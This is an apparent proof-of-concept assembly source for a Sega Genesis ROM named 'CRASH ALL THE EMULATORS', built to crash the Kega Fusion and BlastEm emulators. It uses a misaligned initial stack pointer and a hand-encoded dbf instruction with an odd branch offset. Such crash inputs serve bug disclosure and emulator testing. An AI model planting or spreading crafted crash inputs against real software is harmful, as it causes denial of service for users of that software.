/**
 * poc.S
 *
 * (C) zznop 2019
 *
 * This ROM currently crashes Kega Fusion and BlastEm. I hope to add support for more emulators in the future
 */

.section .text
.globl _start

/******************************************************************************
 *                              VECTOR TABLE
 *****************************************************************************/

.long 0x00FFFE01         /* Initial stack pointer value. A mis-aligned stack is all it takes to crash BlastEm*/
.long _start             /* Start of program */
.long exception_trap     /* Bus error */
.long exception_trap     /* Address error (4) */
.long exception_trap     /* Illegal instruction */
.long exception_trap     /* Division by zero */
.long exception_trap     /* CHK exception */
.long exception_trap     /* TRAPV exception (8) */
.long exception_trap     /* Privilege violation */
.long exception_trap     /* TRACE exception */
.long exception_trap     /* Line-A emulator */
.long exception_trap     /* Line-F emulator (12) */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused (16) */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused (20) */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused (24) */
.long exception_trap     /* Spurious exception */
.long exception_trap     /* IRQ level 1 */
.long extint             /* IRQ level 2 (external interrupt) */
.long exception_trap     /* IRQ level 3 (28) */
.long hblank             /* IRQ level 4 (VDP interrupt / horizontal retrace interrupt) */
.long exception_trap     /* IRQ level 5 */
.long vblank             /* IRQ level 6 (VDP interrupt / vertical retrace interrupt) */
.long exception_trap     /* IRQ level 7 (32) */
.long exception_trap     /* TRAP #00 exception */
.long exception_trap     /* TRAP #01 exception */
.long exception_trap     /* TRAP #02 exception */
.long exception_trap     /* TRAP #03 exception (36) */
.long exception_trap     /* TRAP #04 exception */
.long exception_trap     /* TRAP #05 exception */
.long exception_trap     /* TRAP #06 exception */
.long exception_trap     /* TRAP #07 exception (40) */
.long exception_trap     /* TRAP #08 exception */
.long exception_trap     /* TRAP #09 exception */
.long exception_trap     /* TRAP #10 exception */
.long exception_trap     /* TRAP #11 exception (44) */
.long exception_trap     /* TRAP #12 exception */
.long exception_trap     /* TRAP #13 exception */
.long exception_trap     /* TRAP #14 exception */
.long exception_trap     /* TRAP #15 exception (48) */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */
.long exception_trap     /* Unused */

/******************************************************************************
 *                              ROM HEADER
 *****************************************************************************/

.ascii "SEGA GENESIS    "                                      /* Console name */
.ascii "(c) zznop 2019  "                                      /* Copyright */
.ascii "CRASH ALL THE EMULATORS                         "      /* Domestic name */
.ascii "CRASH ALL THE EMULATORS                         "      /* International name */
.ascii "13371337133713"                                        /* Serial-Revision */
.word 0x0000                                                   /* Checksum */
.ascii "J               "                                      /* I/O support */
.long 0                                                        /* ROM start address */
.long rom_end                                                  /* ROM end address */
.long 0xFF0000                                                 /* RAM start address */
.long 0xFFFFFF                                                 /* RAM end address */
.ascii "            "                                          /* SRAM info */
.ascii "Hack the Planet.                                    "  /* Notes (anything) */
.ascii "JUE             "                                      /* Region */

_start:
    move.w #0x2700, %sr                                        /* Disable interrupts */
    move.l #0x1337, %d0                                        /* Make d0 non-zero */
    .byte  0x51, 0xc8, 0xfb, 0xf2                              /* dbf %d0, $(-0x1e0). This crashes Kega Fusion */
                                                               /* dbf requires a label so we use a byte array instead */

/******************************************************************************
 *                                  TRAPS
 *****************************************************************************/

extint:
    rte

hblank:
    rte

vblank:
    rte

exception_trap:
    nop
    nop
    move.w #1337, %d0
    bra.s exception_trap

rom_end:
